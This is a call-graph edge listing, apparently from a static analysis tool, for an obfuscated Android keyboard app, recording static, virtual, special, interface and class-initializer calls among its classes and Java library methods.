STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r4, $i0, $r9) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r5.<lqk: void <init>(java.lang.Object[],int)>($r6, 3) in <ivw: void <clinit>()> ==> <lqk: void <init>(java.lang.Object[],int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lje: boolean hasNext()>() in <lje: java.lang.Object next()> ==> <lje: boolean hasNext()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/io/InputStream;", r0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqs: lsa l()> ==> <lkq: lsb B()>
STATIC edge: $i1 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkg: void g(int)> ==> <lkg: int a(int,int)>
STATIC edge: $i0 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljd: int f(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
STATIC edge: $l0 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean z(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i2, 3) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("StickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: $r9 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsn: boolean b(lsr)>($r3) in <lsn: boolean ac()> ==> <lsd: boolean b(lsr)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r0, $r4) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>($r5, $r0, $i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<java.lang.Class: java.lang.String getName()>() in <ojg: void h(java.lang.Throwable)> ==> <java.lang.Class: java.lang.String getName()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lsz: boolean equals(java.lang.Object)>($r14) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(3) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r22 = staticinvoke <bel: java.io.InputStream a(java.nio.ByteBuffer)>($r21) in <hbw: java.lang.Object a(java.lang.Object)> ==> <bel: java.io.InputStream a(java.nio.ByteBuffer)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: $i0 = specialinvoke $r2.<lvr: int b()>() in <lvr: void <init>(lvr,lvr)> ==> <lvr: int b()>
SPECIAL edge: specialinvoke $r6.<java.util.NoSuchElementException: void <init>()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqn: void <init>(lkx,java.lang.Object[],int,int)> ==> <lma: void <init>()>
STATIC edge: $r1 = staticinvoke <lme: lma l(java.util.Comparator)>(null) in <lme: void <init>(lkx,int)> ==> <lme: lma l(java.util.Comparator)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i0, $r1, $r2, $r3) in <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r2) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljf: java.lang.Object p()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
VIRTUAL edge: $r12 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(9) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int b(java.lang.Object[],int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>($r0, $r2) in <iye: void D(boolean,java.lang.String,int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" cannot be negative but was: ") in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lid: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<idq: void <init>(java.lang.String,mag)>($r0, $r1) in <idq: idq a(java.lang.String,mag)> ==> <idq: void <init>(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r4 = staticinvoke <kes: java.lang.String k(nfe)>($r27) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void l(int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lkq: int hashCode()>
CLINIT edge: staticinvoke <lkx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkx: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqr: lsa l()> ==> <lma: lkq k()>
VIRTUAL edge: virtualinvoke $r3.<lli: void c(java.util.Map$Entry)>($r6) in <hbv: void j()> ==> <lli: void c(java.util.Map$Entry)>
SPECIAL edge: specialinvoke r0.<android.app.Application: void <init>()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()> ==> <android.app.Application: void <init>()>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r0) in <ojg: void v(java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
VIRTUAL edge: virtualinvoke $r14.<lkl: void h(java.lang.Object)>($r15) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: void h(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsh: lse h(java.util.logging.Level)>($r2) in <lsh: lsw a(java.util.logging.Level)> ==> <lsh: lse h(java.util.logging.Level)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r2.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r0, $r1, 0, 0) in <lsz: lsz c(java.lang.String,java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.ArrayList: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("tags", $r1, 0) in <lsk: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
CLINIT edge: staticinvoke <lwe: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwe: void <clinit>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: $i0 = specialinvoke r0.<ljf: int n()>() in <ljf: java.util.Set f()> ==> <ljf: int n()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i5) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $r0 = staticinvoke <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>($r1) in <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)> ==> <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
STATIC edge: $i1 = staticinvoke <ql: int a(int[],int,int)>($r1, $i2, 0) in <qj: int j()> ==> <ql: int a(int[],int,int)>
CLINIT edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r2) in <ljd: int f(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(6) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<ltr: void <init>()>() in <ltr: void <clinit>()> ==> <ltr: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "array") in <ql: int a(int[],int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(2) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segments", class "[Lj$/util/concurrent/o;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: $r3 = specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int z(int,int,int,int)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r28.<mag: void <init>(java.lang.String,int,int)>("TENOR_STICKER_SEARCH_METADATA", 28, 28) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>(4, $i0) in <izw: int ak(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $r3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>($r3, $r4) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>
STATIC edge: $r10 = staticinvoke <lum: lvt k()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lum: lvt k()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r3.<lvs: void <init>(java.lang.String,int)>("DOUBLE", 3) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke r0.<hbv: boolean o()>() in <hbv: void k(java.lang.Object,boolean)> ==> <hbv: boolean o()>
SPECIAL edge: specialinvoke $r1.<java.util.NoSuchElementException: void <init>()>() in <lnc: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r7) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lkf: void <init>()> ==> <lkx: void <init>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "level") in <lsn: void <init>(java.util.logging.Level)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" component is already registered with a different value.") in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
STATIC edge: $i6 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>($r1, $r2, $r3) in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>(-1640531527) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>
VIRTUAL edge: $c6 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i5) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>("INSTANCE", 0) in <ldr: void <init>()> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>(r0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqn: lsa l()> ==> <lkq: lsb B()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnq: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int c()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: int hashCode()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r5) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $r1 = staticinvoke <lri: java.lang.Object[] o(java.lang.Object[],int)>($r1, $i0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lri: java.lang.Object[] o(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, $r5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, 0, $r8, 0, $i3) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.String: void <init>(char[],int,int)>($r4, $i1, $i0) in <nzh: boolean f(ivv)> ==> <java.lang.String: void <init>(char[],int,int)>
VIRTUAL edge: virtualinvoke $r0.<androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean containsAll(java.util.Collection)>($r4) in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljd: java.util.Map m()> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<lts: java.lang.Object e(int)>($i1) in <lsn: boolean ac()> ==> <lsm: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.util.List asList(java.lang.Object[])>($r1) in <ose: void <clinit>()> ==> <java.util.Arrays: java.util.List asList(java.lang.Object[])>
